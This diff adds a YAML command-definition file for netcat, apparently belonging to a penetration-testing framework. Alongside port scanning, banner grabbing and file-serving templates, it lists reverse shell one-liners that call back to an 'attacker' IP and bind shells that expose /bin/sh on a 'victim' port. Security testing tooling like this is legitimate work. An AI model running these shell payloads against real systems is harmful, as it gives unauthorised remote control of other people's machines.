@@ -1,0 +1,64 @@
+---
+name: netcat
+description: Arbitrary TCP and UDP connections and listeners
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Port Scan":
+    - type: ["bash","standalone"]
+    - text: "nc -z -v {DOMAIN} {INTRANGE}"
+    - input: ["target domain","TCP port number range"]
+    - output: ["STDERR"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Banner Grab":
+    - type: ["bash","standalone"]
+    - text: "nc -nv {DOMAIN} {INT}"
+    - input: ["target domain","TCP port number"]
+    - output: ["STDERR"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Listener":
+    - type: ["bash","standalone"]
+    - text: "nc -lvnp {INT}"
+    - input: ["local port number"]
+    - output: ["STDERR"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Reverse TCP Shell (-e option)":
+    - type: ["other","NX"]
+    - text: "nc -e /bin/sh {IPV4} {INT}"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Reverse TCP Shell (via named pipe)":
+    - type: ["other","NX"]
+    - text: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IPV4} {INT} >/tmp/f"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Bind TCP Shell":
+    - type: ["other","NX"]
+    - text: "nc -l -p {INT} -e /bin/sh"
+    - input: ["victim listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Bind TCP Shell (with SSL)":
+    - type: ["other","NX"]
+    - text: "nc -l --ssl -p {INT} -e /bin/sh"
+    - input: ["victim listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Serve a File Over HTTP":
+    - type: ["bash","autonomous"]
+    - text: "printf 'HTTP/1.1 200 OK\\n\\n%s' \"$(cat {FILE})\" | nc -lp {INT}"
+    - input: ["file to serve","listening TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
